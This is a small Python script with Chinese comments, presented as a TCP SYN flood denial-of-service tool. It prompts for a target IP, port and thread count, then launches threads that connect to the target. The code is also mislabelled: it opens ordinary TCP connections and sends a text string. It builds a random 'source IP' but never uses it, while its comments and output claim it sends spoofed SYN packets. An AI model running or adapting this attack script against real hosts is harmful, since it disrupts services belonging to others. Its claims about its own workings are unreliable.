import socket
import random
import threading
import time


# 发送 SYN 包的函数
def syn_flood(ip, port, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 使用 SO_REUSEADDR 代替 SO_REUSEPORT

    # 随机源 IP
    source_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))

    try:
        sock.connect((ip, port))
        sock.sendto(f"SYN flood attack from {source_ip}".encode(), (ip, port))
        print(f"[线程 {thread_id}] 发送 SYN 包到 {ip} 端口 {port}")
    except Exception as e:
        print(f"[线程 {thread_id}] 发生错误: {e}")
    finally:
        sock.close()


# 获取用户输入
def get_user_input():
    ip = input("请输入目标 IP    : ")
    port = int(input("攻击端口        : "))
    threads = int(input("请输入线程数    : "))
    return ip, port, threads


# 启动 TCP SYN Flood 攻击
def start_syn_flood():
    ip, port, threads = get_user_input()

    for i in range(threads):
        threading.Thread(target=syn_flood, args=(ip, port, i + 1)).start()


if __name__ == "__main__":
    start_syn_flood()
